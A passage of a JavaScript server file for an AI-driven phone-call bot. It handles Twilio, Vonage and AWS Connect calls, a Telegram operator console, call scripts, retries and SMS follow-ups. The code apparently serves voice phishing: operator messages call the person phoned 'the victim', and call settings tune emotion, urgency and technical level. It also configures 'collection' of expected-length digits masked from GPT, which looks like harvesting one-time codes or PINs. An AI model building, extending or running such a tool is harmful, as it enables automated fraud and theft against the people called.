          10,
          Math.round(Number(config.inbound?.preConnectPauseSeconds) || 0),
        ),
      );
      if (preconnectMessage) {
        response.say(preconnectMessage);
        if (pauseSeconds > 0) {
          response.pause({ length: pauseSeconds });
        }
      }
    }
    const connect = response.connect();
    const streamParams = new URLSearchParams();
    const streamParameters = {};
    if (req.body?.From) streamParams.set("from", String(req.body.From));
    if (req.body?.To) streamParams.set("to", String(req.body.To));
    streamParams.set("direction", directionLabel);
    if (req.body?.From) streamParameters.from = String(req.body.From);
    if (req.body?.To) streamParameters.to = String(req.body.To);
    streamParameters.direction = directionLabel;
    if (callSid && config.streamAuth?.secret) {
      const timestamp = String(Date.now());
      const token = buildStreamAuthToken(callSid, timestamp);
      if (token) {
        streamParams.set("token", token);
        streamParams.set("ts", timestamp);
        streamParameters.token = token;
        streamParameters.ts = timestamp;
      }
    }
    const streamQuery = streamParams.toString();
    const streamUrl = `wss://${host}/connection${streamQuery ? `?${streamQuery}` : ""}`;
    // Request both audio + DTMF events from Twilio Media Streams
    const streamOptions = {
      url: streamUrl,
      track: TWILIO_STREAM_TRACK,
      statusCallback: `https://${host}/webhook/twilio-stream`,
      statusCallbackMethod: "POST",
      statusCallbackEvent: ["start", "end"],
    };
    if (Object.keys(streamParameters).length) {
      streamOptions.parameters = streamParameters;
    }
    connect.stream(streamOptions);

    res.type("text/xml");
    res.end(response.toString());
  } catch (err) {
    console.log(err);
    res.status(500).send("Error");
  }
}

// Incoming endpoint used by Twilio to connect the call to our websocket stream
app.post("/incoming", handleTwilioIncoming);
app.get("/incoming", handleTwilioIncoming);

// Telegram callback webhook (live console actions)
app.post("/webhook/telegram", async (req, res) => {
  try {
    const update = req.body;
    res.status(200).send("OK");

    if (!update) return;
    const cb = update.callback_query;
    if (!cb?.data) return;

    const parts = cb.data.split(":");
    const prefix = parts[0];
    let action = null;
    let callSid = null;
    if (prefix === "lc") {
      action = parts[1];
      callSid = parts[2];
    } else if (prefix === "recap" || prefix === "retry") {
      action = parts[1];
      callSid = parts[2];
    } else {
      callSid = parts[1];
    }
    if (!prefix || !callSid || (prefix === "lc" && !action)) {
      webhookService
        .answerCallbackQuery(cb.id, "Unsupported action")
        .catch(() => {});
      return;
    }

    if (prefix === "retry") {
      const retryAction = action;
      try {
        const callRecord = await db.getCall(callSid).catch(() => null);
        const chatId = cb.message?.chat?.id;
        if (!callRecord) {
          webhookService
            .answerCallbackQuery(cb.id, "Call not found")
            .catch(() => {});
          return;
        }
        if (
          callRecord.user_chat_id &&
          chatId &&
          String(callRecord.user_chat_id) !== String(chatId)
        ) {
          webhookService
            .answerCallbackQuery(cb.id, "Not authorized for this call")
            .catch(() => {});
          return;
        }

        if (retryAction === "sms") {
          if (!callRecord?.phone_number) {
            webhookService
              .answerCallbackQuery(cb.id, "No phone number on record")
              .catch(() => {});
            return;
          }
          const callState = await db
            .getLatestCallState(callSid, "call_created")
            .catch(() => null);
          const smsBody = buildRetrySmsBody(callRecord, callState);
          try {
            await smsService.sendSMS(callRecord.phone_number, smsBody);
            webhookService
              .answerCallbackQuery(cb.id, "SMS sent")
              .catch(() => {});
            await webhookService.sendTelegramMessage(
              chatId,
              "💬 Follow-up SMS sent to the victim.",
            );
          } catch (smsError) {
            webhookService
              .answerCallbackQuery(cb.id, "Failed to send SMS")
              .catch(() => {});
            await webhookService.sendTelegramMessage(
              chatId,
              `❌ Failed to send follow-up SMS: ${smsError.message || smsError}`,
            );
          }
          return;
        }

        const payload = await buildRetryPayload(callSid);
        const delayMs = retryAction === "15m" ? 15 * 60 * 1000 : 0;

        if (delayMs > 0) {
          const runAt = new Date(Date.now() + delayMs).toISOString();
          await scheduleCallJob("outbound_call", payload, runAt);
          await db
            .updateCallState(callSid, "retry_scheduled", {
              at: new Date().toISOString(),
              run_at: runAt,
            })
            .catch(() => {});
          webhookService
            .answerCallbackQuery(cb.id, "Retry scheduled")
            .catch(() => {});
          await webhookService.sendTelegramMessage(
            chatId,
            `⏲ Retry scheduled in 15 minutes for ${formatContactLabel(payload)}.`,
          );
          return;
        }

        const retryResult = await placeOutboundCall(payload);
        webhookService
          .answerCallbackQuery(cb.id, "Retry started")
          .catch(() => {});
        await webhookService.sendTelegramMessage(
          chatId,
          `🔁 Retry started for ${formatContactLabel(payload)} (call ${retryResult.callId.slice(-6)}).`,
        );
      } catch (error) {
        webhookService
          .answerCallbackQuery(cb.id, "Retry failed")
          .catch(() => {});
        await webhookService.sendTelegramMessage(
          cb.message?.chat?.id,
          `❌ Retry failed: ${error.message || error}`,
        );
      }
      return;
    }

    if (prefix === "recap") {
      try {
        const callRecord = await db.getCall(callSid).catch(() => null);
        const chatId = cb.message?.chat?.id;
        if (
          callRecord?.user_chat_id &&
          chatId &&
          String(callRecord.user_chat_id) !== String(chatId)
        ) {
          webhookService
            .answerCallbackQuery(cb.id, "Not authorized for this call")
            .catch(() => {});
          return;
        }

        const recapAction = parts[1];
        if (recapAction === "skip") {
          webhookService.answerCallbackQuery(cb.id, "Skipped").catch(() => {});
          return;
        }

        if (recapAction === "sms") {
          if (!callRecord?.phone_number) {
            webhookService
              .answerCallbackQuery(cb.id, "No phone number on record")
              .catch(() => {});
            return;
          }

          const smsBody = buildRecapSmsBody(callRecord);
          try {
            await smsService.sendSMS(callRecord.phone_number, smsBody);
            webhookService
              .answerCallbackQuery(cb.id, "Recap sent via SMS")
              .catch(() => {});
            await webhookService.sendTelegramMessage(
              chatId,
              "📩 Recap sent via SMS to the victim.",
            );
          } catch (smsError) {
            webhookService
              .answerCallbackQuery(cb.id, "Failed to send SMS")
              .catch(() => {});
            await webhookService.sendTelegramMessage(
              chatId,
              `❌ Failed to send recap SMS: ${smsError.message || smsError}`,
            );
          }
          return;
        }
      } catch (error) {
        webhookService
          .answerCallbackQuery(cb.id, "Error handling recap")
          .catch(() => {});
      }
      return;
    }

    const callRecord = await db.getCall(callSid).catch(() => null);
    const chatId = cb.message?.chat?.id;
    if (
      callRecord?.user_chat_id &&
      chatId &&
      String(callRecord.user_chat_id) !== String(chatId)
    ) {
      webhookService
        .answerCallbackQuery(cb.id, "Not authorized for this call")
        .catch(() => {});
      return;
    }
    const callState = await db
      .getLatestCallState(callSid, "call_created")
      .catch(() => null);

    if (prefix === "tr") {
      webhookService
        .answerCallbackQuery(cb.id, "Sending transcript...")
        .catch(() => {});
      await webhookService.sendFullTranscript(
        callSid,
        chatId,
        cb.message?.message_id,
      );
      return;
    }

    if (prefix === "rca") {
      webhookService
        .answerCallbackQuery(cb.id, "Fetching recording…")
        .catch(() => {});
      try {
        await db.updateCallState(callSid, "recording_access_requested", {
          at: new Date().toISOString(),
        });
      } catch (stateError) {
        console.error("Failed to log recording access request:", stateError);
      }
      await webhookService.sendTelegramMessage(
        chatId,
        "🎧 Recording is being prepared. You will receive it here if available.",
      );
      return;
    }

    if (action === "answer" || action === "decline") {
      webhookService
        .answerCallbackQuery(cb.id, "Use the Mini App to answer or decline")
        .catch(() => {});
      return;
    }

    if (action === "privacy") {
      const redacted = webhookService.togglePreviewRedaction(callSid);
      if (redacted === null) {
        webhookService
          .answerCallbackQuery(cb.id, "Console not active")
          .catch(() => {});
        return;
      }
      const label = redacted ? "Preview hidden" : "Preview revealed";
      await logConsoleAction(callSid, "privacy", { redacted });
      webhookService.answerCallbackQuery(cb.id, label).catch(() => {});
      return;
    }

    if (action === "actions") {
      const expanded = webhookService.toggleConsoleActions(callSid);
      if (expanded === null) {
        webhookService
          .answerCallbackQuery(cb.id, "Console not active")
          .catch(() => {});
        return;
      }
      webhookService
        .answerCallbackQuery(
          cb.id,
          expanded ? "Actions expanded" : "Actions hidden",
        )
        .catch(() => {});
      return;
    }

    if (action === "sms") {
      if (!callRecord?.phone_number) {
        webhookService
          .answerCallbackQuery(cb.id, "No phone number on record")
          .catch(() => {});
        return;
      }
      webhookService.lockConsoleButtons(callSid, "Sending SMS…");
      try {
        const inbound = callState?.inbound === true;
        const smsBody = inbound
          ? buildInboundSmsBody(callRecord, callState)
          : buildRetrySmsBody(callRecord, callState);
        await smsService.sendSMS(callRecord.phone_number, smsBody);
        webhookService.addLiveEvent(callSid, "💬 Follow-up SMS sent", {
          force: true,
        });
        await logConsoleAction(callSid, "sms", {
          inbound,
          to: callRecord.phone_number,
        });
        webhookService.answerCallbackQuery(cb.id, "SMS sent").catch(() => {});
      } catch (smsError) {
        webhookService
          .answerCallbackQuery(cb.id, "Failed to send SMS")
          .catch(() => {});
        await webhookService.sendTelegramMessage(
          chatId,
          `❌ Failed to send follow-up SMS: ${smsError.message || smsError}`,
        );
      } finally {
        setTimeout(() => webhookService.unlockConsoleButtons(callSid), 1000);
      }
      return;
    }

    if (action === "callback") {
      if (!callRecord?.phone_number) {
        webhookService
          .answerCallbackQuery(cb.id, "No phone number on record")
          .catch(() => {});
        return;
      }
      webhookService.lockConsoleButtons(callSid, "Scheduling…");
      try {
        const delayMin = Math.max(
          1,
          Number(config.inbound?.callbackDelayMinutes) || 15,
        );
        const runAt = new Date(Date.now() + delayMin * 60 * 1000).toISOString();
        const payload = buildCallbackPayload(callRecord, callState);
        await scheduleCallJob("callback_call", payload, runAt);
        webhookService.addLiveEvent(
          callSid,
          `⏲ Callback scheduled in ${delayMin}m`,
          { force: true },
        );
        await logConsoleAction(callSid, "callback_scheduled", {
          run_at: runAt,
        });
        webhookService
          .answerCallbackQuery(cb.id, "Callback scheduled")
          .catch(() => {});
      } catch (callbackError) {
        webhookService
          .answerCallbackQuery(cb.id, "Failed to schedule callback")
          .catch(() => {});
      } finally {
        setTimeout(() => webhookService.unlockConsoleButtons(callSid), 1000);
      }
      return;
    }

    if (action === "block" || action === "allow" || action === "spam") {
      if (!callRecord?.phone_number) {
        webhookService
          .answerCallbackQuery(cb.id, "No phone number on record")
          .catch(() => {});
        return;
      }
      const status =
        action === "block"
          ? "blocked"
          : action === "allow"
            ? "allowed"
            : "spam";
      const flagPhone =
        normalizePhoneForFlag(callRecord.phone_number) ||
        callRecord.phone_number;
      webhookService.lockConsoleButtons(callSid, "Saving…");
      try {
        await db.setCallerFlag(flagPhone, status, {
          updated_by: chatId,
          source: "telegram",
        });
        webhookService.setCallerFlag(callSid, status);
        webhookService.addLiveEvent(callSid, `📛 Caller marked ${status}`, {
          force: true,
        });
        await logConsoleAction(callSid, "caller_flag", {
          status,
          phone_number: flagPhone,
        });
        webhookService
          .answerCallbackQuery(cb.id, `Caller ${status}`)
          .catch(() => {});
      } catch (flagError) {
        webhookService
          .answerCallbackQuery(cb.id, "Failed to update caller flag")
          .catch(() => {});
      } finally {
        setTimeout(() => webhookService.unlockConsoleButtons(callSid), 1000);
      }
      return;
    }

    if (action === "rec") {
      webhookService.lockConsoleButtons(callSid, "Recording…");
      try {
        await db.updateCallState(callSid, "recording_requested", {
          at: new Date().toISOString(),
        });
        webhookService.addLiveEvent(callSid, "⏺ Recording requested", {
          force: true,
        });
        await logConsoleAction(callSid, "recording");
        webhookService
          .answerCallbackQuery(cb.id, "Recording toggled")
          .catch(() => {});
      } catch (e) {
        webhookService
          .answerCallbackQuery(cb.id, `Failed: ${e.message}`.slice(0, 180))
          .catch(() => {});
      }
      setTimeout(() => webhookService.unlockConsoleButtons(callSid), 1200);
      return;
    }

    if (action === "compact") {
      const isCompact = webhookService.toggleConsoleCompact(callSid);
      if (isCompact === null) {
        webhookService
          .answerCallbackQuery(cb.id, "Console not active")
          .catch(() => {});
        return;
      }
      await logConsoleAction(callSid, "compact", { compact: isCompact });
      webhookService
        .answerCallbackQuery(
          cb.id,
          isCompact ? "Compact view enabled" : "Full view enabled",
        )
        .catch(() => {});
      return;
    }

    if (action === "end") {
      webhookService.lockConsoleButtons(callSid, "Ending…");
      try {
        await endCallForProvider(callSid);
        webhookService.setLiveCallPhase(callSid, "ended").catch(() => {});
        await logConsoleAction(callSid, "end");
        webhookService
          .answerCallbackQuery(cb.id, "Ending call...")
          .catch(() => {});
      } catch (e) {
        webhookService
          .answerCallbackQuery(cb.id, `Failed: ${e.message}`.slice(0, 180))
          .catch(() => {});
        webhookService.unlockConsoleButtons(callSid);
      }
      setTimeout(() => webhookService.unlockConsoleButtons(callSid), 1500);
      return;
    }

    if (action === "xfer") {
      if (!config.twilio.transferNumber) {
        webhookService
          .answerCallbackQuery(cb.id, "Transfer not configured")
          .catch(() => {});
        return;
      }
      webhookService.lockConsoleButtons(callSid, "Transferring…");
      try {
        const transferCall = require("./functions/transferCall");
        await transferCall({ callSid });
        webhookService
          .markToolInvocation(callSid, "transferCall")
          .catch(() => {});
        await logConsoleAction(callSid, "transfer");
        webhookService
          .answerCallbackQuery(cb.id, "Transferring...")
          .catch(() => {});
      } catch (e) {
        webhookService
          .answerCallbackQuery(
            cb.id,
            `Transfer failed: ${e.message}`.slice(0, 180),
          )
          .catch(() => {});
        webhookService.unlockConsoleButtons(callSid);
      }
      setTimeout(() => webhookService.unlockConsoleButtons(callSid), 2000);
      return;
    }
  } catch (error) {
    try {
      res.status(200).send("OK");
    } catch {}
    console.error("Telegram webhook error:", error);
  }
});

const handleVonageAnswer = (req, res) => {
  const callSid = req.query.callSid;
  const wsUrl = `wss://${config.server.hostname}/vonage/stream?callSid=${callSid}`;

  res.json([
    {
      action: "connect",
      endpoint: [
        {
          type: "websocket",
          uri: wsUrl,
          "content-type": "audio/pcmu;rate=8000",
        },
      ],
    },
  ]);
};

const handleVonageEvent = async (req, res) => {
  try {
    const { uuid, status, duration } = req.body || {};
    const callSid =
      req.query.callSid || (uuid ? vonageCallMap.get(uuid) : null) || uuid;

    const statusMap = {
      started: { status: "initiated", notification: "call_initiated" },
      ringing: { status: "ringing", notification: "call_ringing" },
      answered: { status: "answered", notification: "call_answered" },
      completed: { status: "completed", notification: "call_completed" },
      busy: { status: "busy", notification: "call_busy" },
      failed: { status: "failed", notification: "call_failed" },
      timeout: { status: "no-answer", notification: "call_no_answer" },
      cancelled: { status: "canceled", notification: "call_canceled" },
    };

    const mapped = statusMap[String(status || "").toLowerCase()];
    if (callSid && mapped) {
      await recordCallStatus(callSid, mapped.status, mapped.notification, {
        duration: duration ? parseInt(duration, 10) : undefined,
      });
      if (mapped.status === "completed") {
        const session = activeCalls.get(callSid);
        if (session?.startTime) {
          await handleCallEnd(callSid, session.startTime);
        }
        activeCalls.delete(callSid);
      }
    }

    res.status(200).send("OK");
  } catch (error) {
    console.error("Vonage webhook error:", error);
    res.status(200).send("OK");
  }
};

app.get("/webhook/vonage/answer", handleVonageAnswer);
app.get("/answer", handleVonageAnswer);

app.post("/webhook/vonage/event", handleVonageEvent);
app.post("/event", handleVonageEvent);

app.post("/webhook/aws/status", async (req, res) => {
  try {
    const { contactId, status, duration, callSid } = req.body || {};
    const resolvedCallSid =
      callSid || (contactId ? awsContactMap.get(contactId) : null);
    if (!resolvedCallSid) {
      return res.status(200).send("OK");
    }

    const normalized = String(status || "").toLowerCase();
    const map = {
      initiated: { status: "initiated", notification: "call_initiated" },
      connected: { status: "answered", notification: "call_answered" },
      ended: { status: "completed", notification: "call_completed" },
      failed: { status: "failed", notification: "call_failed" },
      no_answer: { status: "no-answer", notification: "call_no_answer" },
      busy: { status: "busy", notification: "call_busy" },
    };
    const mapped = map[normalized];
    if (mapped) {
      await recordCallStatus(
        resolvedCallSid,
        mapped.status,
        mapped.notification,
        {
          duration: duration ? parseInt(duration, 10) : undefined,
        },
      );
      if (mapped.status === "completed") {
        const session = activeCalls.get(resolvedCallSid);
        if (session?.startTime) {
          await handleCallEnd(resolvedCallSid, session.startTime);
        }
        activeCalls.delete(resolvedCallSid);
      }
    }

    res.status(200).send("OK");
  } catch (error) {
    console.error("AWS status webhook error:", error);
    res.status(200).send("OK");
  }
});

app.post("/aws/transcripts", async (req, res) => {
  try {
    const { callSid, transcript, isPartial } = req.body || {};
    if (!callSid || !transcript) {
      return res
        .status(400)
        .json({ success: false, error: "callSid and transcript required" });
    }
    if (isPartial) {
      return res.status(200).json({ success: true });
    }
    const session = await ensureAwsSession(callSid);
    clearSilenceTimer(callSid);
    await db.addTranscript({
      call_sid: callSid,
      speaker: "user",
      message: transcript,
      interaction_count: session.interactionCount,
    });
    await db.updateCallState(callSid, "user_spoke", {
      message: transcript,
      interaction_count: session.interactionCount,
    });
    if (shouldCloseConversation(transcript) && session.interactionCount >= 1) {
      await speakAndEndCall(
        callSid,
        CALL_END_MESSAGES.user_goodbye,
        "user_goodbye",
      );
      session.interactionCount += 1;
      return res.status(200).json({ success: true });
    }
    enqueueGptTask(callSid, async () => {
      const currentCount = session.interactionCount || 0;
      try {
        await session.gptService.completion(transcript, currentCount);
      } catch (gptError) {
        console.error("GPT completion error:", gptError);
        webhookService.addLiveEvent(callSid, "⚠️ GPT error, retrying", {
          force: true,
        });
      }
      session.interactionCount = currentCount + 1;
    });
    res.status(200).json({ success: true });
  } catch (error) {
    console.error("AWS transcript webhook error:", error);
    res
      .status(500)
      .json({ success: false, error: "Failed to ingest transcript" });
  }
});

// Provider status/update endpoints (admin only)
app.get("/admin/provider", requireAdminToken, async (req, res) => {
  const readiness = getProviderReadiness();

  res.json({
    provider: currentProvider,
    stored_provider: storedProvider,
    supported_providers: SUPPORTED_PROVIDERS,
    twilio_ready: readiness.twilio,
    aws_ready: readiness.aws,
    vonage_ready: readiness.vonage,
  });
});

app.post("/admin/provider", requireAdminToken, async (req, res) => {
  const { provider } = req.body || {};
  if (!provider || !SUPPORTED_PROVIDERS.includes(provider)) {
    return res
      .status(400)
      .json({ success: false, error: "Unsupported provider" });
  }
  const readiness = getProviderReadiness();
  if (!readiness[provider]) {
    return res.status(400).json({
      success: false,
      error: `Provider ${provider} is not configured`,
    });
  }
  const normalized = provider.toLowerCase();
  const changed = normalized !== currentProvider;
  currentProvider = normalized;
  storedProvider = normalized;
  return res.json({ success: true, provider: currentProvider, changed });
});

// Personas list for bot selection
app.get("/api/personas", async (req, res) => {
  res.json({
    success: true,
    builtin: builtinPersonas,
    custom: [],
  });
});

// Call script endpoints for bot script management
app.get("/api/call-scripts", requireAdminToken, async (req, res) => {
  try {
    const scripts = await db.getCallTemplates();
    res.json({ success: true, scripts });
  } catch (error) {
    res
      .status(500)
      .json({ success: false, error: "Failed to fetch call scripts" });
  }
});

app.get("/api/call-scripts/:id", requireAdminToken, async (req, res) => {
  try {
    const scriptId = Number(req.params.id);
    if (Number.isNaN(scriptId)) {
      return res
        .status(400)
        .json({ success: false, error: "Invalid script id" });
    }
    const script = await db.getCallTemplateById(scriptId);
    if (!script) {
      return res
        .status(404)
        .json({ success: false, error: "Script not found" });
    }
    res.json({ success: true, script });
  } catch (error) {
    res
      .status(500)
      .json({ success: false, error: "Failed to fetch call script" });
  }
});

app.post("/api/call-scripts", requireAdminToken, async (req, res) => {
  try {
    const { name, first_message } = req.body || {};
    if (!name || !first_message) {
      return res
        .status(400)
        .json({ success: false, error: "name and first_message are required" });
    }
    const id = await db.createCallTemplate(req.body);
    const script = await db.getCallTemplateById(id);
    res.status(201).json({ success: true, script });
  } catch (error) {
    res
      .status(500)
      .json({ success: false, error: "Failed to create call script" });
  }
});

app.put("/api/call-scripts/:id", requireAdminToken, async (req, res) => {
  try {
    const scriptId = Number(req.params.id);
    if (Number.isNaN(scriptId)) {
      return res
        .status(400)
        .json({ success: false, error: "Invalid script id" });
    }
    const updated = await db.updateCallTemplate(scriptId, req.body || {});
    if (!updated) {
      return res
        .status(404)
        .json({ success: false, error: "Script not found" });
    }
    const script = await db.getCallTemplateById(scriptId);
    if (inboundDefaultScriptId === scriptId) {
      inboundDefaultScript = script || null;
      inboundDefaultLoadedAt = Date.now();
    }
    res.json({ success: true, script });
  } catch (error) {
    res
      .status(500)
      .json({ success: false, error: "Failed to update call script" });
  }
});

app.delete("/api/call-scripts/:id", requireAdminToken, async (req, res) => {
  try {
    const scriptId = Number(req.params.id);
    if (Number.isNaN(scriptId)) {
      return res
        .status(400)
        .json({ success: false, error: "Invalid script id" });
    }
    const deleted = await db.deleteCallTemplate(scriptId);
    if (!deleted) {
      return res
        .status(404)
        .json({ success: false, error: "Script not found" });
    }
    if (inboundDefaultScriptId === scriptId) {
      await db.setSetting(INBOUND_DEFAULT_SETTING_KEY, null);
      inboundDefaultScriptId = null;
      inboundDefaultScript = null;
      inboundDefaultLoadedAt = Date.now();
    }
    res.json({ success: true });
  } catch (error) {
    res
      .status(500)
      .json({ success: false, error: "Failed to delete call script" });
  }
});

app.post("/api/call-scripts/:id/clone", requireAdminToken, async (req, res) => {
  try {
    const scriptId = Number(req.params.id);
    if (Number.isNaN(scriptId)) {
      return res
        .status(400)
        .json({ success: false, error: "Invalid script id" });
    }
    const existing = await db.getCallTemplateById(scriptId);
    if (!existing) {
      return res
        .status(404)
        .json({ success: false, error: "Script not found" });
    }
    const payload = {
      ...existing,
      name: req.body?.name || `${existing.name} Copy`,
    };
    delete payload.id;
    const newId = await db.createCallTemplate(payload);
    const script = await db.getCallTemplateById(newId);
    res.status(201).json({ success: true, script });
  } catch (error) {
    res
      .status(500)
      .json({ success: false, error: "Failed to clone call script" });
  }
});

app.get("/api/inbound/default-script", requireAdminToken, async (req, res) => {
  try {
    await refreshInboundDefaultScript(true);
    if (!inboundDefaultScript) {
      return res.json({ success: true, mode: "builtin" });
    }
    return res.json({
      success: true,
      mode: "script",
      script_id: inboundDefaultScriptId,
      script: inboundDefaultScript,
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: "Failed to fetch inbound default script",
    });
  }
});

app.put("/api/inbound/default-script", requireAdminToken, async (req, res) => {
  try {
    const scriptId = Number(req.body?.script_id);
    if (!Number.isFinite(scriptId)) {
      return res
        .status(400)
        .json({ success: false, error: "script_id is required" });
    }
    const script = await db.getCallTemplateById(scriptId);
    if (!script) {
      return res
        .status(404)
        .json({ success: false, error: "Script not found" });
    }
    if (!script.prompt || !script.first_message) {
      return res.status(400).json({
        success: false,
        error: "Script must include prompt and first_message",
      });
    }
    await db.setSetting(INBOUND_DEFAULT_SETTING_KEY, String(scriptId));
    inboundDefaultScriptId = scriptId;
    inboundDefaultScript = script;
    inboundDefaultLoadedAt = Date.now();
    await db.logServiceHealth("inbound_defaults", "set", {
      script_id: scriptId,
      script_name: script.name,
      source: "api",
    });
    return res.json({
      success: true,
      mode: "script",
      script_id: scriptId,
      script,
    });
  } catch (error) {
    res
      .status(500)
      .json({ success: false, error: "Failed to set inbound default script" });
  }
});

app.delete(
  "/api/inbound/default-script",
  requireAdminToken,
  async (req, res) => {
    try {
      await db.setSetting(INBOUND_DEFAULT_SETTING_KEY, null);
      inboundDefaultScriptId = null;
      inboundDefaultScript = null;
      inboundDefaultLoadedAt = Date.now();
      await db.logServiceHealth("inbound_defaults", "cleared", {
        source: "api",
      });
      return res.json({ success: true, mode: "builtin" });
    } catch (error) {
      res.status(500).json({
        success: false,
        error: "Failed to clear inbound default script",
      });
    }
  },
);

// Caller flags (block/allow/spam)
app.get("/api/caller-flags", requireAdminToken, async (req, res) => {
  try {
    const status = req.query?.status;
    const limit = req.query?.limit;
    const flags = await db.listCallerFlags({ status, limit });
    res.json({ success: true, flags });
  } catch (error) {
    console.error("Failed to list caller flags:", error);
    res
      .status(500)
      .json({ success: false, error: "Failed to list caller flags" });
  }
});

app.post("/api/caller-flags", requireAdminToken, async (req, res) => {
  try {
    const phoneInput = req.body?.phone_number || req.body?.phone || null;
    const status = String(req.body?.status || "").toLowerCase();
    const note = req.body?.note || null;
    const phone = normalizePhoneForFlag(phoneInput) || phoneInput;
    if (!phone) {
      return res
        .status(400)
        .json({ success: false, error: "phone_number is required" });
    }
    if (!["blocked", "allowed", "spam"].includes(status)) {
      return res.status(400).json({
        success: false,
        error: "status must be blocked, allowed, or spam",
      });
    }
    const flag = await db.setCallerFlag(phone, status, {
      note,
      updated_by: req.headers?.["x-admin-user"] || null,
      source: "api",
    });
    res.json({ success: true, flag });
  } catch (error) {
    console.error("Failed to set caller flag:", error);
    res
      .status(500)
      .json({ success: false, error: "Failed to set caller flag" });
  }
});

async function buildRetryPayload(callSid) {
  const callRecord = await db.getCall(callSid);
  if (!callRecord) {
    throw new Error("Call not found");
  }
  const callState = await db
    .getLatestCallState(callSid, "call_created")
    .catch(() => null);

  return {
    number: callRecord.phone_number,
    prompt: callRecord.prompt,
    first_message: callRecord.first_message,
    user_chat_id: callRecord.user_chat_id,
    customer_name: callState?.customer_name || callState?.victim_name || null,
    business_id: callState?.business_id || null,
    script: callState?.script || null,
    script_id: callState?.script_id || null,
    purpose: callState?.purpose || null,
    emotion: callState?.emotion || null,
    urgency: callState?.urgency || null,
    technical_level: callState?.technical_level || null,
    voice_model: callState?.voice_model || null,
    collection_profile: callState?.collection_profile || null,
    collection_expected_length: callState?.collection_expected_length || null,
    collection_timeout_s: callState?.collection_timeout_s || null,
    collection_max_retries: callState?.collection_max_retries || null,
    collection_mask_for_gpt: callState?.collection_mask_for_gpt,
    collection_speak_confirmation: callState?.collection_speak_confirmation,
  };
}

async function scheduleCallJob(jobType, payload, runAt = null) {
  if (!db) throw new Error("Database not initialized");
  return db.createCallJob(jobType, payload, runAt);
}

function computeCallJobBackoff(attempt) {
  const base = Number(config.callJobs?.retryBaseMs) || 5000;
  const max = Number(config.callJobs?.retryMaxMs) || 60000;
  const exp = Math.max(0, Number(attempt) - 1);
  const delay = Math.min(base * Math.pow(2, exp), max);
  return delay;
}

async function processCallJobs() {
  if (!db || callJobProcessing) return;
  callJobProcessing = true;
  try {
    const jobs = await db.claimDueCallJobs(10);
    for (const job of jobs) {
      let payload = {};
      try {
        payload = job.payload ? JSON.parse(job.payload) : {};
      } catch {
        payload = {};
      }
      try {
        if (
          job.job_type === "outbound_call" ||
          job.job_type === "callback_call"
        ) {
          await placeOutboundCall(payload);
        } else {
          throw new Error(`Unsupported job type ${job.job_type}`);
        }
        await db.completeCallJob(job.id, "completed");
      } catch (error) {
        const attempts = Number(job.attempts) || 1;
        const maxAttempts = Number(config.callJobs?.maxAttempts) || 3;
        if (attempts >= maxAttempts) {
          await db.completeCallJob(
            job.id,
            "failed",
            error.message || String(error),
          );
        } else {
          const delay = computeCallJobBackoff(attempts);
          const nextRunAt = new Date(Date.now() + delay).toISOString();
          await db.rescheduleCallJob(
            job.id,
            nextRunAt,
            error.message || String(error),
          );
        }
      }
    }
  } catch (error) {
    console.error("Call job processor error:", error);
  } finally {
    callJobProcessing = false;
  }
}

async function placeOutboundCall(payload, hostOverride = null) {
  const {
    number,
    prompt,
    first_message,
    user_chat_id,
    customer_name,
    business_id,
    script,
    script_id,
    purpose,
    emotion,
    urgency,
    technical_level,
    voice_model,
    collection_profile,
    collection_expected_length,
    collection_timeout_s,
    collection_max_retries,
    collection_mask_for_gpt,
    collection_speak_confirmation,
  } = payload || {};

  if (!number || !prompt || !first_message) {
    throw new Error(
      "Missing required fields: number, prompt, and first_message are required",
    );
  }

  if (!number.match(/^\+[1-9]\d{1,14}$/)) {
    throw new Error(
      "Invalid phone number format. Use E.164 format (e.g., +1234567890)",
    );
  }

  const host = hostOverride || config.server?.hostname;
  if (!host) {
    throw new Error("Server hostname not configured");
  }

  console.log("Generating adaptive function system for call...".blue);
  const functionSystem = functionEngine.generateAdaptiveFunctionSystem(
    prompt,
    first_message,
  );
  console.log(
    `Generated ${functionSystem.functions.length} functions for ${functionSystem.context.industry} industry`,
  );

  let callId;
  let callStatus = "queued";
  let providerMetadata = {};
  let selectedProvider = null;

  const readiness = getProviderReadiness();
  const orderedProviders = getProviderOrder(currentProvider);
  const availableProviders = orderedProviders.filter(
    (provider) => readiness[provider],
  );
  if (!availableProviders.length) {
    throw new Error("No outbound provider configured");
  }
  const failoverEnabled = config.providerFailover?.enabled !== false;
  const healthyProviders = failoverEnabled
    ? availableProviders.filter((provider) => !isProviderDegraded(provider))
    : availableProviders;
  const attemptProviders = healthyProviders.length
    ? healthyProviders
    : availableProviders;
  let lastError = null;

  for (const provider of attemptProviders) {
    try {
      if (provider === "twilio") {
        warnIfMachineDetectionDisabled("outbound-call");
        const accountSid = config.twilio.accountSid;
        const authToken = config.twilio.authToken;
        const fromNumber = config.twilio.fromNumber;

        if (!accountSid || !authToken || !fromNumber) {
          throw new Error("Twilio credentials not configured");
        }

        const client = twilio(accountSid, authToken);
        const twimlUrl = `https://${host}/incoming`;
        const statusUrl = `https://${host}/webhook/call-status`;
        console.log(
          `Twilio call URLs: twiml=${twimlUrl} statusCallback=${statusUrl}`,
        );
        const callPayload = {
          url: twimlUrl,
          to: number,
          from: fromNumber,
          statusCallback: statusUrl,
          statusCallbackEvent: [
            "initiated",
            "ringing",
            "answered",
            "completed",
            "busy",
            "no-answer",
            "canceled",
            "failed",
          ],
          statusCallbackMethod: "POST",
        };
        if (config.twilio?.machineDetection) {
          callPayload.machineDetection = config.twilio.machineDetection;
        }
        if (Number.isFinite(config.twilio?.machineDetectionTimeout)) {
          callPayload.machineDetectionTimeout =
            config.twilio.machineDetectionTimeout;
        }
        const call = await client.calls.create(callPayload);
        callId = call.sid;
        callStatus = call.status || "queued";
      } else if (provider === "aws") {
        const awsAdapter = getAwsConnectAdapter();
        callId = uuidv4();
        const response = await awsAdapter.startOutboundCall({
          destinationPhoneNumber: number,
          clientToken: callId,
          attributes: {
            CALL_SID: callId,
            FIRST_MESSAGE: first_message,
          },
        });
        providerMetadata = { contact_id: response.ContactId };
        if (response.ContactId) {
          awsContactMap.set(response.ContactId, callId);
        }
        callStatus = "queued";
      } else if (provider === "vonage") {
        const vonageAdapter = getVonageVoiceAdapter();
        callId = uuidv4();
        const answerUrl =
          config.vonage.voice.answerUrl ||
          `https://${host}/webhook/vonage/answer?callSid=${callId}`;
        const eventUrl =
          config.vonage.voice.eventUrl ||
          `https://${host}/webhook/vonage/event?callSid=${callId}`;
